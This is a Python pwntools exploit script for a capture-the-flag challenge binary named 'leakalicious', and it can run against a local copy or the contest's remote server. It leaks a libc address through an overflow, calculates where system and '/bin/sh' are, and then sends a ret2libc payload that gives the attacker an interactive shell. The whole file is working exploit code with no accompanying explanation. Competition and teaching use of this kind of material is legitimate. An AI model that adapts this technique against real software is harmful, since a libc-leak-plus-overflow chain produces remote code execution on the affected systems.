from pwn import *
import sys

def exploit(p, libc_diff, libc):
    binary = ELF("leakalicious")
    padding = 44
    
    payload = ''
    payload += 'A' * 43
    p.sendlineafter("> ", payload)
    p.recvline()

    libc_leak = u32(p.recv(4))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc.address = libc_leak - libc_diff # remote libc
    log.info("Libc base address : {}".format(hex(libc.address)))
    libc_system = libc.symbols["system"]
    log.info("Libc system address : {}".format(hex(libc_system)))
    libc_binsh = libc.search("/bin/sh").next()
    log.info("Libc /bin/sh : {}".format(hex(libc_binsh)))

    payload = ''
    payload += 'A' * padding
    payload += p32(libc_system)
    payload += "JUNK"
    payload += p32(libc_binsh)

    p.sendline(payload)
    p.sendline("gladys")
    # gdb.attach(p, '''
    #             brva *0x128a
    #             c
    #             ''')
    p.interactive()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        log.info("Argument needed!")
        log.info("Usage: python {} <local/remote>".format(sys.argv[0]))
        sys.exit(0)
    elif sys.argv[1] == "local":
        p = process("./leakalicious")
        libc = ELF("libc6_2.27-3ubuntu1_i386.so")
        exploit(p, 0x018e81, libc)
    elif sys.argv[1] == "remote":
        p = remote("chal.tuctf.com", 30505)
        libc = ELF("libc6_2.23-0ubuntu10_i386.so")
        exploit(p, 0x018637, libc)
    else:
        sys.exit(0)